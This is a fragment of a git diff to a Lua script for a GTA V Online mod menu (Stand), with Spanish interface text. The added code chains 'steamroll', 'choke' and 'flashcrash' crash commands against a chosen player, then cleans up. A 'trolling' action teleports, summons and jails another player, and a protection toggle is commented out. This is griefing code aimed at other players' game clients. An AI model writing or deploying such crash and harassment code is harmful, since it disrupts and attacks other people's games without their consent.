+        util.yield(800)
+        menu.trigger_commands("steamroll"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("choke"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("flashcrash"..players.get_name(player_id))
+        util.yield(1800)
+        util.toast("Espera en lo que se limpia todo...")
+        --menu.trigger_command(outSync, "off")
+        menu.trigger_commands("rcleararea")
+        menu.trigger_commands("potatomode off")
+        menu.trigger_commands("trafficpotato off")
+        util.yield(8000)
+        menu.trigger_commands("anticrashcamera off")
+    end)
+
     -- Structure premade for the next crash
 
 
@@ -1698,11 +1956,11 @@ players.on_join(function(player_id)
     --end)
 
     menu.action(trolling, "Enviar Al Bote", {}, "", function()
-        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
+        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
         local my_ped = PLAYER.GET_PLAYER_PED(players.user())
         ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
-        menu.trigger_commands("givesh " .. players.get_name(player_id))
-        menu.trigger_commands("summon " .. players.get_name(player_id))
+        menu.trigger_commands("givesh "..players.get_name(player_id))
+        menu.trigger_commands("summon "..players.get_name(player_id))
         menu.trigger_commands("invisibility on")
         menu.trigger_commands("otr")
         util.yield(5000)
@@ -2853,18 +3111,18 @@ if bailOnAdminJoin then
     end
 end
 
-menu.toggle_loop(protects, "Bloquear Error De Transaccion 'Test'", {}, "Es probable que conlleve errores, usar bajo responsabilidad", function(on_toggle)
-    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
-    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Notification")
-    if on_toggle then
-        menu.trigger_command(TransactionError, "on")
-        menu.trigger_command(TransactionErrorV, "on")
-        for i = 1, 100 do
-            menu.trigger_commands("removeloader")
-        end
-        --util.toast("No es mi culpa el error del log, esperen a que Stand lo arregle")
-    end
-end)
+--menu.toggle_loop(protects, "Bloquear Error De Transaccion 'Test'", {}, "Es probable que conlleve errores, usar bajo responsabilidad", function(on_toggle)
+--    local TransactionError = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Block")
+--    local TransactionErrorV = menu.ref_by_path("Online>Protections>Events>Transaction Error Event>Notification")
+--    if on_toggle then
+--        menu.trigger_command(TransactionError, "on")
+--        menu.trigger_command(TransactionErrorV, "on")
+--        for i = 1, 100 do
+--            menu.trigger_commands("removeloader")
+--        end
+--        --util.toast("No es mi culpa el error del log, esperen a que Stand lo arregle")
+--    end
+--end)
 
 --menu.toggle_loop(protects, "Bloquear Fuego/Lag", {}, "", function()
 --    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
@@ -3733,6 +3991,7 @@ end)
 util.on_stop(function ()
     VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
     ENTITY.SET_ENTITY_COLLISION(veh, true, true);
+    menu.collect_garbage()
     sleep(100)
     util.toast("Adious\nEspero te haya gustado :3")
     util.toast("Limpiando...")
